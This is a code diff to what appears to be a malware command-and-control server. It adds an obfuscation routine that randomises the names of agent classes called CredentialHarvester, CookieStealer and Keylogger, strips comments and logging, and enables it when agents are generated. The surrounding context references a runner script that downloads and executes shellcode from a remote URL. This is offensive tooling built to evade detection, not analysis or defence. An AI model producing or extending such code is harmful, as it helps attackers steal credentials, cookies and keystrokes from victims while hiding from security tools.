@@ -17,6 +17,264 @@ import traceback  # For detailed error reporting
 
 
 
+def _obfuscate_code(code):
+    """Apply obfuscation to the agent code"""
+    import random
+    import string
+    import re
+
+    # Generate random names
+    random_class_name = ''.join(random.choices(string.ascii_letters, k=8))
+    random_cookie_class_name = ''.join(random.choices(string.ascii_letters, k=8))
+    random_keylogger_class_name = ''.join(random.choices(string.ascii_letters, k=8))
+    random_shellcode_runner_class_name = ''.join(random.choices(string.ascii_letters, k=8))
+
+    def generate_random_string(length):
+        """Generate a random string of given length"""
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+    def obfuscate_log_message(line):
+        """Replace log message content with random string while preserving structure"""
+        # Pattern to match logging calls like logger.info("message") or logger.error(f"message {var}")
+        log_patterns = [
+            r'logger\.info\((.*?)\)',
+            r'logger\.error\((.*?)\)',
+            r'logger\.warning\((.*?)\)',
+            r'logger\.debug\((.*?)\)',
+            r'self\._log\((.*?)\)',
+            r'self\._log_error\((.*?)\)',
+            r'self\._log_info\((.*?)\)'
+        ]
+
+        obfuscated_line = line
+        for pattern in log_patterns:
+            matches = re.findall(pattern, line)
+            for match in matches:
+                # Extract the content inside parentheses
+                content = match.strip()
+                if content.startswith('"') and content.endswith('"'):
+                    # Simple string literal
+                    original_length = len(content) - 2  # Subtract quotes
+                    random_content = generate_random_string(original_length)
+                    obfuscated_line = obfuscated_line.replace(content, f'"{random_content}"')
+                elif content.startswith('f"') and content.endswith('"'):
+                    # f-string
+                    inside_content = content[2:-1]  # Remove f" and "
+                    # Find string parts and preserve expressions
+                    parts = re.split(r'(\{[^}]+\})', inside_content)
+                    obfuscated_parts = []
+                    for part in parts:
+                        if part.startswith('{') and part.endswith('}'):
+                            # Keep expressions as-is
+                            obfuscated_parts.append(part)
+                        else:
+                            # Replace string content with random
+                            random_part = generate_random_string(len(part))
+                            obfuscated_parts.append(random_part)
+                    obfuscated_content = ''.join(obfuscated_parts)
+                    obfuscated_line = obfuscated_line.replace(content, f'f"{obfuscated_content}"')
+
+        return obfuscated_line
+
+    lines = code.split('\n')
+    obfuscated_lines = []
+    in_multiline_string = False
+    multiline_string_delimiter = None
+
+    i = 0
+    while i < len(lines):
+        line = lines[i]
+        stripped = line.strip()
+
+        # Handle multi-line strings (triple quotes)
+        if not in_multiline_string:
+            # Check for start of multi-line string
+            if '"""' in line:
+                quote_count = line.count('"""')
+                if quote_count == 1:
+                    # Single triple quote - starts multi-line string
+                    in_multiline_string = True
+                    multiline_string_delimiter = '"""'
+                    obfuscated_lines.append(line)
+                    i += 1
+                    continue
+                elif quote_count == 2 and stripped.startswith('"""') and stripped.endswith('"""'):
+                    # Single-line docstring, remove it
+                    i += 1
+                    continue
+            elif "'''" in line:
+                quote_count = line.count("'''")
+                if quote_count == 1:
+                    # Single triple quote - starts multi-line string
+                    in_multiline_string = True
+                    multiline_string_delimiter = "'''"
+                    obfuscated_lines.append(line)
+                    i += 1
+                    continue
+                elif quote_count == 2 and stripped.startswith("'''") and stripped.endswith("'''"):
+                    # Single-line docstring, remove it
+                    i += 1
+                    continue
+        else:
+            # Inside multi-line string
+            if multiline_string_delimiter in line:
+                quote_count = line.count(multiline_string_delimiter)
+                if quote_count >= 1:
+                    # End of multi-line string
+                    in_multiline_string = False
+                    multiline_string_delimiter = None
+            obfuscated_lines.append(line)
+            i += 1
+            continue
+
+        # Skip single-line docstrings (already handled above)
+
+        # Remove all comment lines
+        if stripped.startswith('#'):
+            i += 1
+            continue
+
+        # Replace logger calls with pass
+        if ('logger.info(' in line or 'logger.error(' in line or 'logger.warning(' in line or 'logger.debug(' in line or
+            'self._log(' in line or 'self._log_error(' in line or 'self._log_info(' in line):
+            indent = len(line) - len(line.lstrip())
+            obfuscated_lines.append(' ' * indent + 'pass')
+            i += 1
+            continue
+
+        # Remove all print() calls entirely
+        if 'print(' in line.strip():
+            i += 1
+            continue
+
+        # Rename CredentialHarvester class
+        if 'class CredentialHarvester:' in line:
+            indent = len(line) - len(line.lstrip())
+            obfuscated_lines.append(' ' * indent + f'class {random_class_name}:')
+            i += 1
+            continue
+        elif 'CredentialHarvester.' in line:
+            obfuscated_lines.append(line.replace('CredentialHarvester.', f'{random_class_name}.'))
+            i += 1
+            continue
+
+        # Rename CookieStealer class
+        if 'class CookieStealer:' in line:
+            indent = len(line) - len(line.lstrip())
+            obfuscated_lines.append(' ' * indent + f'class {random_cookie_class_name}:')
+            i += 1
+            continue
+        elif 'CookieStealer(' in line:
+            obfuscated_lines.append(line.replace('CookieStealer(', f'{random_cookie_class_name}('))
+            i += 1
+            continue
+
+        # Rename Keylogger class
+        if 'class Keylogger:' in line:
+            indent = len(line) - len(line.lstrip())
+            obfuscated_lines.append(' ' * indent + f'class {random_keylogger_class_name}:')
+            i += 1
+            continue
+        elif 'Keylogger(' in line:
+            obfuscated_lines.append(line.replace('Keylogger(', f'{random_keylogger_class_name}('))
+            i += 1
+            continue
+
+     
+
+        # Remove inline comments while preserving indentation
+        if '#' in line:
+            # Find the first '#' that is not inside quotes
+            in_single_quote = False
+            in_double_quote = False
+            comment_start = -1
+            for idx, char in enumerate(line):
+                if char == "'" and not in_double_quote:
+                    in_single_quote = not in_single_quote
+                elif char == '"' and not in_single_quote:
+                    in_double_quote = not in_double_quote
+                elif char == '#' and not in_single_quote and not in_double_quote:
+                    comment_start = idx
+                    break
+            if comment_start != -1:
+                line = line[:comment_start].rstrip()
+
+        # Keep the line
+        obfuscated_lines.append(line)
+
+        i += 1
+
+    # Post-process to add 'pass' statements to empty blocks after colons
+    def post_process_for_empty_blocks(lines):
+        processed_lines = []
+        i = 0
+        while i < len(lines):
+            line = lines[i]
+            processed_lines.append(line)
+            if line.strip().endswith(':'):
+                block_indent = len(line) - len(line.lstrip())
+                # Check if there's any indented content in the block
+                has_content = False
+                j = i + 1
+                while j < len(lines):
+                    next_line = lines[j]
+                    if next_line.strip() == '':
+                        j += 1
+                        continue
+                    if next_line.strip().startswith('#'):
+                        j += 1
+                        continue
+                    next_indent = len(next_line) - len(next_line.lstrip())
+                    if next_indent > block_indent:
+                        has_content = True
+                        break
+                    else:
+                        # Next line is at same or less indentation, block ends
+                        break
+                if not has_content:
+                    # Insert pass statement
+                    processed_lines.append(' ' * (block_indent + 4) + 'pass')
+            i += 1
+        return processed_lines
+
+    # Post-process to fix empty blocks
+    def post_process_for_empty_blocks(lines):
+        processed_lines = []
+        i = 0
+        while i < len(lines):
+            line = lines[i]
+            processed_lines.append(line)
+            stripped = line.strip()
+
+            # Check if line ends with ':' and is not a comment
+            if stripped.endswith(':') and not stripped.startswith('#'):
+                # Look ahead to see if there's indented content
+                has_indented_content = False
+                j = i + 1
+                while j < len(lines):
+                    next_line = lines[j]
+                    if next_line.strip() == '' or next_line.startswith(' ') or next_line.startswith('\t'):
+                        if next_line.strip() != '':
+                            has_indented_content = True
+                            break
+                    elif next_line.strip() != '':
+                        # Non-empty line that's not indented, so block ends
+                        break
+                    j += 1
+
+                if not has_indented_content:
+                    # Add pass statement with proper indentation
+                    indent = len(line) - len(line.lstrip())
+                    processed_lines.append(' ' * (indent + 4) + 'pass')
+
+            i += 1
+        return processed_lines
+
+    obfuscated_lines = post_process_for_empty_blocks(obfuscated_lines)
+
+    return '\n'.join(obfuscated_lines)
+
+
 def _generate_runner_script(shellcode_url, callback_url=None):
     """Generate the Python runner script that will download and execute shellcode"""
     script = f"""import socket
@@ -695,7 +953,8 @@ def init_api_routes(app, socketio):
                 aes_iv=repr(CONFIG.aes_iv)     # Keep as bytes object
             )
 
-            # No obfuscation applied
+            # Apply obfuscation
+            agent_code = _obfuscate_code(agent_code)
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
